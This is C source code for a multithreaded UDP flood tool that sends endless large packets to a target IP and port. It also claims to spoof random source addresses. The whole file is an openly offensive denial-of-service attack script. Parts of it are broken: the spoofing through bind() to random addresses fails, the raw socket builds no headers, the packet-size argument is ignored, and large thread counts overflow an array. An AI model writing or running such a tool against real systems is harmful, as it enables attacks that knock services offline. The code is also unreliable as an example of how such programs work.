#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>

#define PACKET_SIZE 8192   // Increased packet size
#define MAX_THREADS 5000   // Increased thread capacity

// Function to generate a random IP address for spoofing
void generate_random_ip(char *buffer) {
    sprintf(buffer, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

void *flood(void *arg) {
    char *target_ip = ((char **)arg)[0];
    int target_port = atoi(((char **)arg)[1]);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    char packet[PACKET_SIZE];
    memset(packet, rand() % 256, PACKET_SIZE);  // Fill packet with random data

    while (1) {
        char spoofed_ip[16];
        generate_random_ip(spoofed_ip);

        struct sockaddr_in spoofed_addr = {0};
        spoofed_addr.sin_family = AF_INET;
        inet_pton(AF_INET, spoofed_ip, &spoofed_addr.sin_addr);

        if (bind(sock, (struct sockaddr *)&spoofed_addr, sizeof(spoofed_addr)) < 0) {
            perror("Binding failed");
            continue;
        }

        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <Port> <Duration> <PacketSize> <ThreadCount>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));  // Seed for random IP generation

    int thread_count = atoi(argv[5]);
    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < thread_count; ++i) {
        pthread_create(&threads[i], NULL, flood, argv + 1);
    }

    sleep(atoi(argv[3]));  // Duration
    return 0;
}
